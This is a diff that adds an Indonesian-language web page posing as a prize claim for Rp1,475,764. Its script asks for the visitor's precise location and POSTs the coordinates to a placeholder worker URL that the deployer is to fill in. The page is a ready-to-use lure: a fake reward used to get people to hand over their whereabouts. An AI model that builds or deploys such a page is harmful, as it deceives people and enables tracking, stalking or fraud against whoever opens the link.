@@ -1,0 +1,183 @@
+<!doctype html>
+<html lang="id">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Klaim Hadiah Rp1.475.764</title>
+    <style>
+      * {
+        box-sizing: border-box;
+      }
+      body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background: linear-gradient(135deg, #ff4fa3, #ff8ac7);
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #fff;
+      }
+      .card {
+        width: min(92%, 430px);
+        background: #fff;
+        color: #333;
+        border-radius: 24px;
+        padding: 30px 24px;
+        text-align: center;
+        box-shadow: 0 18px 50px #a50055aa;
+      }
+      .badge {
+        display: inline-block;
+        background: #ffe0ef;
+        color: #d6006d;
+        padding: 8px 15px;
+        border-radius: 999px;
+        font-weight: bold;
+      }
+      h1 {
+        color: #d6006d;
+        font-size: 30px;
+        margin: 18px 0 8px;
+      }
+      .money {
+        font-size: 36px;
+        font-weight: 800;
+        color: #ff2f91;
+        margin: 15px 0;
+      }
+      p {
+        line-height: 1.5;
+        color: #666;
+      }
+      .notice {
+        background: #fff4fa;
+        border: 1px solid #ffc2df;
+        border-radius: 14px;
+        padding: 13px;
+        text-align: left;
+        font-size: 13px;
+      }
+      button {
+        width: 100%;
+        border: 0;
+        border-radius: 14px;
+        padding: 16px;
+        margin-top: 18px;
+        background: #ff2f91;
+        color: #fff;
+        font-size: 17px;
+        font-weight: bold;
+        cursor: pointer;
+      }
+      button:disabled {
+        opacity: 0.6;
+      }
+      .status {
+        margin-top: 15px;
+        font-size: 14px;
+        color: #666;
+      }
+      .success {
+        color: #159447;
+        font-weight: bold;
+      }
+      .error {
+        color: #c62828;
+        font-weight: bold;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="card">
+      <span class="badge">🎁 PROGRAM HADIAH</span>
+
+      <h1>Klaim Hadiah</h1>
+
+      <div class="money">Rp1.475.764</div>
+
+      <p>
+        Untuk melanjutkan proses klaim, Anda dapat membagikan lokasi perangkat
+        Anda.
+      </p>
+
+      <div class="notice">
+        <b>Persetujuan lokasi:</b><br />
+        Dengan menekan tombol di bawah, browser akan meminta izin lokasi. Jika
+        Anda menyetujui, koordinat lokasi akan dikirim ke server klaim untuk
+        diproses. Jika menolak, lokasi tidak akan dikirim.
+      </div>
+
+      <button id="claim">📍 Klaim & Bagikan Lokasi</button>
+
+      <div id="status" class="status"></div>
+    </div>
+
+    <script>
+      const WORKER_URL = "https://GANTI-DENGAN-URL-WORKER-KAMU.workers.dev";
+
+      const btn = document.getElementById("claim");
+      const status = document.getElementById("status");
+
+      btn.onclick = () => {
+        if (!navigator.geolocation) {
+          status.className = "status error";
+          status.textContent = "Browser tidak mendukung lokasi.";
+          return;
+        }
+
+        btn.disabled = true;
+        status.textContent = "Meminta izin lokasi...";
+
+        navigator.geolocation.getCurrentPosition(
+          async (pos) => {
+            const data = {
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              accuracy: pos.coords.accuracy,
+              timestamp: new Date().toISOString(),
+            };
+
+            try {
+              const res = await fetch(WORKER_URL, {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json",
+                },
+                body: JSON.stringify(data),
+              });
+
+              const result = await res.json();
+
+              if (!res.ok || !result.ok) {
+                throw new Error(result.error || "Gagal mengirim lokasi.");
+              }
+
+              status.className = "status success";
+              status.textContent = "Lokasi berhasil diterima. Terima kasih.";
+            } catch (e) {
+              status.className = "status error";
+              status.textContent = e.message;
+              btn.disabled = false;
+            }
+          },
+
+          () => {
+            status.className = "status error";
+            status.textContent =
+              "Lokasi tidak dibagikan. Silakan izinkan lokasi jika ingin melanjutkan.";
+
+            btn.disabled = false;
+          },
+
+          {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0,
+          },
+        );
+      };
+    </script>
+  </body>
+</html>
